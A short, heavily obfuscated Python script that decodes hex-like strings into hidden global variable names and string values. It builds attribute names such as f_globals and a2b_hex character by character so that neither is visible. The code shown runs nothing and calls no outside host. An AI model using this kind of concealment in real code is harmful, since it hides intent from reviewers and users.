import sys
import binascii as ba
from functools import reduce
from itertools import tee

d = ['744468dc614b6b2453f54910560c4490h23cf36c219ed0c38f296283e139c982o7J4M7C6O6N486L2Q5HfI4X1X57064C9GhNo',
     '696f681466ee671e7c217e4a79447f6a5df54d185a0443915df16db2665b7493o6c6f601e6bec6c127f277b4872447b6d50f',
     '46c3f63ca6391685f61e57c4157fd6hbc605a7a92o7c4c7b246f1b6fb0744457fd48165e0d4f93h04f3781ac4a0fd86f061a',
     'c88cb276a81e78ed3400d194ef4884de7563f637f4065b4619f7b55294e0874b5fcd05o7e4d772c6f1f66bb704c56f876376',
     '8596f3170216c59714ah5a713f36db51b630ef531e242ab5abf1d21635288dfd3211d5bbd9484b06d861f0b75df742c0bffo',
     '6j6b65c46O9g7v356g5c7t245ffr6e1d7b0j64965Ofg6vby655t7g9h']

for g in reduce('e551f61c'.__class__.__add__, d).split('\157'):
    a = 'ab'
    b = f'f{chr(0o137)}'
    c = getattr(sys._getframe(0), f'{b}glo{a[::-1]}ls')
    h = 97
    e, f = (g[i::2].partition(chr(h ^ 0b1001))[0] for i in range(2))
    g = ''.join(map(chr, (b+(not f-int(str(h)[::-1])) for i, j in (tee(map(ord, e[:1]+f)),) if next(j, None) is not None for f, b in zip(i, j) if (b>>4)^4 or ~b&15)))
    c[getattr(c[a[::-1]], ''.join(c[0]+c[1] for c in zip(a, '2_'))+chr(h^0b1001)+'e'+chr(h^0o31))(e).decode()] = g
